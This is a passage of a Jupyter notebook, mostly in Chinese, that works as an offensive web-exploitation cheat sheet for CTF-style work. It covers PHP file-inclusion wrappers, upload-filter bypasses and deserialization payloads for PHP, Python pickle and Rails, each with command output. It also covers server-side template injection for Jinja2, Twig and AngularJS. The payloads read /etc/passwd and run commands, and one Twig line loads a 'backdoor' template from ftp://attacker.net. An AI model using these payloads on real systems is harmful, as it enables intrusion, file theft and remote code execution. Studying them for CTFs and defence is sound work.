    "HTTP_User_Agent塞php script"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## php://filter"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "php://filter/convert.base64-encode/resource=index.php\n",
    "php://filter/convert.base64-decode/resource=index.php\n",
    "php://filter/read=string.rot13/resource=index.php\n",
    "php://filter/zlib.deflate/resource=index.php\n",
    "php://filter/zlib.inflate/resource=index.php\n",
    "php://filter/convert.quoted-printable-encode/resource=index.php\n",
    "php://filter/read=string.strip_tags/resource=php://input\n",
    "php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=index.php\n",
    "php://filter/convert.iconv.UCS-4LE.UCS-4BE/resource=index.php"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## php://input"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "?page=php://input\n",
    "post data: <?php system(\"net user\"); ?>\n",
    "需要有開啟url_allow_include，5.4.0直接廢除"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## phpinfo"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "對server以form-data上傳文件，會產生tmp檔\n",
    "利用phpinfo得到tmp檔路徑和名稱\n",
    "LFI Get shell\n",
    "限制\n",
    "Ubuntu 17後，預設開啟PrivateTmp，無法利用"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## php session"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "Session一般存在sess_{PHPSESSID}中\n",
    "可以透過修改Cookie再LFI拿shell\n",
    "以下為常見存放路徑\n",
    "/var/tmp/\n",
    "/tmp/\n",
    "/var/lib/php5/\n",
    "/var/lib/php/\n",
    "C:\\windows\\temp\\sess_\n",
    "windows\n",
    "\n",
    "session.upload_progress\n",
    "PHP預設開啟\n",
    "用來監控上傳檔案進度\n",
    "當session.upload_progress.enabled開啟，可以POST在$_SESSION中添加資料 (sess_{PHPSESSID})\n",
    "配合LFI可以getshell\n",
    "session.upload_progress.cleanup=on時，可以透過Race condition\n",
    "Example\n",
    "HITCON CTF 2018 - One Line PHP Challenge\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## data://"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "條件\n",
    "allow_url_fopen: On\n",
    "allow_url_include: On\n",
    "\n",
    "用法\n",
    "?file=data://text/plain,<?php phpinfo()?>\n",
    "?file=data:text/plain,<?php phpinfo()?>\n",
    "?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4="
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## zip / phar"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "適用驗證副檔名時\n",
    "\n",
    "zip\n",
    "新建zip，裡頭壓縮php腳本(可改副檔名)\n",
    "?file=zip://myzip.zip#php.jpg\n",
    "    \n",
    "phar\n",
    "  <?php\n",
    "      $p = new PharData(dirname(__FILE__).'/phartest.zip',0,'phartest2',Phar::ZIP);\n",
    "      $x = file_get_contents('./a.php');\n",
    "      $p->addFromString('b.jpg', $x);\n",
    "  ?>\n",
    "\n",
    "構造 ?file=phar://phartest.zip/b.jpg"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## SSI (Server Side Includes)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "通常放在.shtml, .shtm\n",
    "Execute Command\n",
    "<!--#exec cmd=\"command\"-->\n",
    "File Include\n",
    "<!--#include file=\"../../web.config\"-->\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 上傳漏洞"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Javascript檢測"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "Burp Suite 中間修改\n",
    "disable javascript"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Bypass MIME Detection"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "Burp修改Content-Type"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 黑名單判斷副檔名"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 大小寫繞過"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "pHP\n",
    "AsP"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 空格 / 點 繞過"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "Windows特性\n",
    ".php(空格) // burp修改\n",
    ".asp."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### php3457"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    ".php3\n",
    ".php4\n",
    ".php5\n",
    ".php7\n",
    ".pht\n",
    ".phtml"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### .htaccess"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "<FilesMatch \"kai\">\n",
    "SetHandler application/x-httpd-php\n",
    "</FilesMatch>"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 文件解析漏洞"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Magic Number"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### jpg"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "FF D8 FF E0 00 10 4A 46 49 46"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### gif"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "47 49 36 38 39 61"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### png"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "89 50 4E 47"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 其他"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 常見場景：配合文件解析漏洞"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# 反序列化"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## PHP - Serialize() / Unserialize()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 魔术方法"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "__construct()\n",
    "Object被new時調用，但unserialize()不調用\n",
    "__destruct()\n",
    "Object被銷毀時調用\n",
    "__wakeup()\n",
    "unserialize時自動調用\n",
    "__sleep()\n",
    "被serialize時調用\n",
    "__toString()\n",
    "物件被當成字串時調用"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Value"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "String\n",
    "s:size:value;\n",
    "Integer\n",
    "i:value;\n",
    "Boolean\n",
    "b:value; ('1' or '0')\n",
    "NULL\n",
    "N;\n",
    "Array\n",
    "a:size:{key definition; value definition; (repeat per element)}\n",
    "Object\n",
    "O:strlen(class name):class name:object size:{s:strlen(property name):property name:property definition;(repeat per property)}\n",
    "其他\n",
    "C - custom object\n",
    "R - pointer reference"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Public / Private / Protected 序列化"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "例如：class名字為: Kaibro，變數名字: test\n",
    "\n",
    "若為Public，序列化後：\n",
    "\n",
    "...{s:4:\"test\";...}\n",
    "若為Private，序列化後：\n",
    "\n",
    "...{s:12:\"%00Kaibro%00test\"}\n",
    "若為Protected，序列化後：\n",
    "\n",
    "...{s:7:\"%00*%00test\";...}\n",
    "Private和Protected會多兩個NULL byte"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Example"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "<?php\n",
    "\n",
    "class Kaibro {\n",
    "    public $test = \"ggininder\";\n",
    "    function __wakeup()\n",
    "    {\n",
    "        system(\"echo \".$this->test);\n",
    "    }\n",
    "}\n",
    "\n",
    "$input = $_GET['str'];\n",
    "$kb = unserialize($input);"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "Input: .php?str=O:6:\"Kaibro\":1:{s:4:\"test\";s:3:\";id\";}\n",
    "Output: uid=33(www-data) gid=33(www-data) groups=33(www-data)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Example 2 - Private"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "<?php\n",
    "\n",
    "class Kaibro {\n",
    "    private $test = \"ggininder\";\n",
    "    function __wakeup()\n",
    "    {\n",
    "        system(\"echo \".$this->test);\n",
    "    }\n",
    "}\n",
    "\n",
    "$input = $_GET['str'];\n",
    "$kb = unserialize($input);"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "Input: .php?str=O:6:\"Kaibro\":1:{s:12:\"%00Kaibro%00test\";s:3:\";id\";}\n",
    "Output: uid=33(www-data) gid=33(www-data) groups=33(www-data)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### CVE-2016-7124"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "影響版本：\n",
    "PHP5 < 5.6.25\n",
    "PHP7 < 7.0.10\n",
    "物件屬性個數大於真正的屬性個數，會略過__wakeup的執行\n",
    "反序列化會失敗，但是__destruct會執行\n",
    "HITCON 2016"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 小特性"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "O:+4:\"test\":1:{s:1:\"a\";s:3:\"aaa\";}\n",
    "O:4:\"test\":1:{s:1:\"a\";s:3:\"aaa\";}\n",
    "兩者結果相同"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Phar:// 反序列化"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "phar文件會將使用者自定義的metadata以序列化形式保存\n",
    "透過phar://偽協議可以達到反序列化的效果\n",
    "常見影響函數: file_get_contents(), file_exists(), is_dir(), ...\n",
    "Generic Gadget Chains\n",
    "phpggc\n",
    "https://github.com/ambionics/phpggc\n",
    "\n",
    "https://github.com/orangetw/My-CTF-Web-Challenges"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Python Pickle"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "dumps() 將物件序列化成字串\n",
    "loads() 將字串反序列化\n",
    "\n",
    "Example:\n",
    "\n",
    "a.py:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import os\n",
    "import cPickle\n",
    "import sys\n",
    "import base64\n",
    "\n",
    "class Exploit(object):\n",
    "    def __reduce__(self):\n",
    "        return (os.system, ('id',))\n",
    "    \n",
    "shellcode = cPickle.dumps(Exploit())\n",
    "print base64.b64encode(shellcode)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "b.py:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import os\n",
    "import cPickle\n",
    "import sys\n",
    "import base64\n",
    "\n",
    "s = raw_input(\":\")\n",
    "\n",
    "print cPickle.loads(base64.b64decode(s))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "$ python a.py > tmp\n",
    "$ cat tmp | python b.py\n",
    "uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),110(lxd)\n",
    "\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Ruby/Rails Marshal"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "this one is not self-executing\n",
    "\n",
    "this one actually relies on rails invoking a method on the resulting object after the deserialization"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "erb = ERB.allocate\n",
    "erb.instance_variable_set :@src, \"`id`\"\n",
    "depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new erb, :result, \"foo\", ActiveSupport::Deprecation\n",
    "hash = {depr => 'something'}\n",
    "marshalled = Marshal.dump(hash)\n",
    "print marshalled"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "在ERB上，當result或run method被call時，@src的string會被執行\n",
    "\n",
    "常見使用情境：\n",
    "    以Marshal為Cookie Serializer時，若有secret_key，則可以偽造Cookie\n",
    "    也可以透過DeprecatedInstanceVariableProxy去執行ERB的result來RCE\n",
    "        當DeprecatedInstanceVariableProxy被unmarshal，rails session對他處理時遇到不認識的method就會呼叫method_missing，導致執行傳入的ERB\n",
    "        @instance.__send__(@method)\n",
    "        \n",
    "Cookie Serializer\n",
    "    Rails 4.1以前的Cookie Serializer為Marshal\n",
    "    Rails 4.1開始，默認使用JSON"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Ruby/Rails YAML"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### CVE-2013-0156"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "舊版本的Rails中，XML的node可以自訂type，如果指定為yaml，是會被成功解析的\n",
    "若反序列化!ruby/hash，則相當於在物件上調用obj[key]=val，也就是[]=方法\n",
    "而這個ActionDispatch::Routing::RouteSet::NamedRouteCollection中的[]=方法中，有一條代碼路徑可以eval\n",
    "define_hash_access中可以看到module_eval，裏頭的selector來自name\n",
    "因為他還會對value調用defaults method，所以可以利用OpenStruct來構造\n",
    "函數名=>返回值的對應關係存放在@table中\n",
    "Payload:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "xml = %{  \n",
    "<?xml version=\"1.0\" encoding=\"UTF-8\"?>  \n",
    "<bingo type='yaml'>  \n",
    "---| !ruby/hash:ActionDispatch::Routing::RouteSet::NamedRouteCollection  \n",
    "'test; sleep(10); test' :  \n",
    " !ruby/object:OpenStruct  \n",
    "  table:  \n",
    "   :defaults: {}  \n",
    "</bingo>\n",
    "\n",
    "}.strip"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### CVE-2013-0333"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "Rails 2.3.x和3.0.x中，允許text/json的request轉成YAML解析\n",
    "Yaml在Rails 3.0.x是預設的JSON Backend\n",
    "出問題的地方在於YAML.load前的convert_json_to_yaml，他不會檢查輸入的JSON是否合法\n",
    "一樣可以透過ActionController::Routing::RouteSet::NamedRouteCollection#define_hash_access的module_eval來RCE"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Java Deserialization"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 序列化資料特徵"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "ac ed 00 05 ...\n",
    "rO0AB ... (Base64)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 反序列化觸發點"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "readObject()\n",
    "readExternal()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### JEP290"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "Java 9 新特性，並向下支援到 8u121, 7u13, 6u141\n",
    "增加黑、白名單機制\n",
    "Builtin Filter\n",
    "    JDK 包含了 Builtin Filter (白名單機制) 在 RMI Registry 和 RMI Distributed Garbage Collector\n",
    "    只允許特定 class 被反序列化\n",
    "    許多 RMI Payload 失效 (即便 classpath 有 gadegt)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Codebase"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "JDK 6u45, 7u21 開始，useCodebaseOnly 預設為 true\n",
    "    禁止自動載入遠端 class 文件\n",
    "JDK 6u132, 7u122, 8u113 下，com.sun.jndi.rmi.object.trustURLCodebase, com.sun.jndi.cosnaming.object.trustURLCodebase 預設為 false\n",
    "    RMI 預設不允許從遠端 Codebase 載入 Reference class\n",
    "JDK 11.0.1, 8u191, 7u201, 6u211 後，com.sun.jndi.ldap.object.trustURLCodebase 預設為 false\n",
    "    LDAP 預設不允許從遠端 Codebase 載入 Reference class"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Tool"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "yososerial https://github.com/frohoff/ysoserial\n",
    "    URLDNS: 不依賴任何額外library，可以用來做 dnslog 驗證\n",
    "    CommonCollections 1~7: Common collections 各版本 gadget chain\n",
    "        \n",
    "BaRMIe https://github.com/NickstaDB/BaRMIe\n",
    "    專打 Java RMI (enumerating, attacking)\n",
    "\n",
    "marshalsec https://github.com/mbechler/marshalsec\n",
    "\n",
    "SerializationDumper https://github.com/NickstaDB/SerializationDumper\n",
    "    分析 Serialization Stream，如Magic頭、serialVersionUID、newHandle等\n",
    "    \n",
    "gadgetinspector https://github.com/JackOfMostTrades/gadgetinspector\n",
    "    Bytecode Analyzer\n",
    "    找 gadget chain\n",
    "    \n",
    "GadgetProbe https://github.com/BishopFox/GadgetProbe\n",
    "    透過字典檔配合DNS callback，判斷環境使用哪些library, class等資訊"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Java-Deserialization-Cheat-Sheet"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Example"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "0CTF 2019 Final - hotel booking system\n",
    "https://balsn.tw/ctf_writeup/20190608-0ctf_tctf2019finals/#tctf-hotel-booking-system\n",
    "\n",
    "TrendMicro CTF 2018 Qual - Forensics 300 \n",
    "TrendMicro CTF 2019 Qual - Forensics 300\n",
    "TrendMicro CTF 2019 Final - RMIart\n",
    "https://github.com/balsn/ctf_writeup"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## .NET Derserialization"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Tool"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "ysoserial.net\n",
    "https://github.com/pwntester/ysoserial.net"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### asp.net 中 ViewState 以序列化形式保存資料"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "有 machinekey 或 viewstate 未加密/驗證時，有機會 RCE"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Example"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "HITCON CTF 2018 - Why so Serials?\n",
    "https://blog.kaibro.tw/2018/10/24/HITCON-CTF-2018-Web/"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# SSTI"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Server-Side Template Injection"
   ]
  },
  {
   "attachments": {
    "%E5%9B%BE%E7%89%87.png": {
     "image/png": "[encoded data removed]"
    }
   },
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "![%E5%9B%BE%E7%89%87.png](attachment:%E5%9B%BE%E7%89%87.png)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Testing"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "{{ 7*'7' }}\n",
    "    Twig: 49\n",
    "    Jinja2: 7777777\n",
    "        \n",
    "<%= 7*7 %>\n",
    "    Ruby ERB: 49"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Flask/Jinja2"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Dump all used classes"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "{{ ''.__class__.__mro__[2].__subclasses__() }}"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Read File"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Write File"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "{{''.__class__.__mro__[2].__subclasses__()[40]('/var/www/app/a.txt', 'w').write('Kaibro Yo!')}}"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### RCE"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\\n\\nRUNCMD = check_output\\n') }}\n",
    "    evil config\n",
    "{{ config.from_pyfile('/tmp/evilconfig.cfg') }}\n",
    "    load config\n",
    "{{ config['RUNCMD']('cat flag',shell=True) }}"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### RCE (another way)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "{{''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('ls').read()}}"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Python3 RCE"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "{% for c in [].__class__.__base__.__subclasses__() %}\n",
    "  {% if c.__name__ == 'catch_warnings' %}\n",
    "    {% for b in c.__init__.__globals__.values() %}\n",
    "    {% if b.__class__ == {}.__class__ %}\n",
    "      {% if 'eval' in b.keys() %}\n",
    "        {{ b['eval']('__import__(\"os\").popen(\"id\").read()') }}\n",
    "      {% endif %}\n",
    "    {% endif %}\n",
    "    {% endfor %}\n",
    "  {% endif %}\n",
    "{% endfor %}"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 過濾中括號"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "__getitem__\n",
    "{{''.__class__.__mro__.__getitem__(2)}}\n",
    "{{''.__class__.__mro__[2]}}"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 過濾{{ or }}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "用{%%}\n",
    "執行結果往外傳\n",
    "\n",
    "過濾.\n",
    "\n",
    "{{''.__class__}}\n",
    "{{''['__class__']}}\n",
    "{{''|attr('__class__')}}\n",
    "過濾Keyword\n",
    "\n",
    "用\\xff形式去繞\n",
    "{{''[\"\\x5f\\x5fclass\\x5f\\x5f\"]}}\n",
    "用request繞\n",
    "\n",
    "{{''.__class__}}\n",
    "{{''[request.args.kaibro]}}&kaibro=__class__"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "用{%%}\n",
    "執行結果往外傳"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 過濾."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "{{''.__class__}}\n",
    "    {{''['__class__']}}\n",
    "    {{''|attr('__class__')}}"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 過濾Keyword"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "用\\xff形式去繞\n",
    "{{''[\"\\x5f\\x5fclass\\x5f\\x5f\"]}}"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 用request繞"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "{{''.__class__}}\n",
    "    {{''[request.args.kaibro]}}&kaibro=__class__"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Twig / Symfony"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### RCE"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "{{['id']|map('passthru')}}\n",
    "{{['id']|filter('system')}}\n",
    "{{app.request.query.filter(0,'curl${IFS}kaibro.tw',1024,{'options':'system'})}}\n",
    "{{_self.env.setCache(\"ftp://attacker.net:21\")}}{{_self.env.loadTemplate(\"backdoor\")}}\n",
    "{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Read file"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "{{'/etc/passwd'|file_excerpt(30)}}"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Version"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "{{constant('Twig\\\\Environment::VERSION')}}"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## AngularJS"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### v1.6後移除Sandbox"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Payload"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "{{ 7*7 }} => 49\n",
    "{{ this }}\n",
    "{{ this.toString() }}\n",
    "{{ constructor.toString() }}\n",
    "{{ constructor.constructor('alert(1)')() }} 2.1 v1.0.1-v1.1.5\n",
    "{{ a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')() }} 2.1 v1.0.1-v1.1.5\n",
    "{{ toString.constructor.prototype.toString=toString.constructor.prototype.call;[\"a\",\"alert(1)\"].sort(toString.constructor) }} 2.3 v1.2.19-v1.2.23\n",
    "{{'a'.constructor.prototype.charAt=''.valueOf;$eval(\"x='\\\"+(y='if(!window\\\\u002ex)alert(window\\\\u002ex=1)')+eval(y)+\\\"'\");}} v1.2.24-v1.2.29\n",
    "{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}} v1.3.20\n",
    "{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}} v1.4.0-v1.4.9\n",
    "{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}} v1.5.0-v1.5.8\n",
    "{{ [].pop.constructor('alert(1)')() }} 2.8 v1.6.0-1.6.6"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Vue.js"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
